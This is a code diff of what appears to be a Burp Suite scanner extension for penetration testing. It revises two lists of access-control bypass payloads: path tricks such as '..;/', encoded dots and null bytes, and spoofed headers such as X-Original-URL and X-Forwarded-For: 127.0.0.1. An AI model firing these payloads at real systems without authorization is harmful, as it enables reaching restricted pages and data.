@@ -58,8 +58,8 @@ class BurpExtender(IBurpExtender, IScannerCheck):
         self.stdout.println(self._helpers.analyzeRequest(baseRequestResponse).getHeaders())
 
 
-        payloads = ["%2e/"+LastPath, LastPath+"/.", "./"+LastPath+"/./", LastPath+"%20/", "%20"+LastPath+"%20/", LastPath+"..;/",LastPath+"?",LastPath+"??","/"+LastPath+"//",LastPath+"/",LastPath+"/.randomstring",LastPath+"%",LastPath+"%09/",LastPath+"../",LastPath+"..%2f",LastPath+"..%00/",LastPath+"..%0d/",LastPath+"..%5c",LastPath+"..%ff/",LastPath+".%2e/",LastPath+"?randomstring"]
-        hpayloads = ["X-Rewrite-URL: "+OriginalUrl, "X-Original-URL: "+OriginalUrl,"Referer: /"+LastPath, "X-Custom-IP-Authorization: 127.0.0.1","X-Originating-IP: 127.0.0.1","X-Forwarded-For: 127.0.0.1","X-Remote-IP: 127.0.0.1","X-Client-IP: 127.0.0.1","X-Host: 127.0.0.1","X-Forwarded-Host: 127.0.0.1"]
+        payloads = ["%2e/"+LastPath, LastPath+"/.", "./"+LastPath+"/./", LastPath+"%20/", "%20"+LastPath+"%20/", LastPath+"..;/", LastPath+"?", LastPath+"??", "/"+LastPath+"//", LastPath+"/", LastPath+"/.random", LastPath+".json", LastPath+"%23", LastPath+"%26", LastPath+".%2e/", ".//"+LastPath, LastPath+"/%00", "/"+LastPath+"/%00"]
+        hpayloads = ["X-Rewrite-URL: "+OriginalUrl, "X-Original-URL: "+OriginalUrl, "Referer: /"+LastPath, "X-Custom-IP-Authorization: 127.0.0.1", "X-Originating-IP: 127.0.0.1", "X-Forwarded-For: 127.0.0.1", "X-Remote-IP: 127.0.0.1", "X-Client-IP: 127.0.0.1", "X-Host: 127.0.0.1", "X-Forwarded-Host: 127.0.0.1", "X-Original-URL: "+LastPath, "X-Forwarded-For: 127.0.0.1:80", "X-Forwarded-For: 127.0.0.1:443", "X-Forwarded-For: http://127.0.0.1", "X-Rewrite-URL: "+LastPath]
         results = []
 
         for p in payloads:
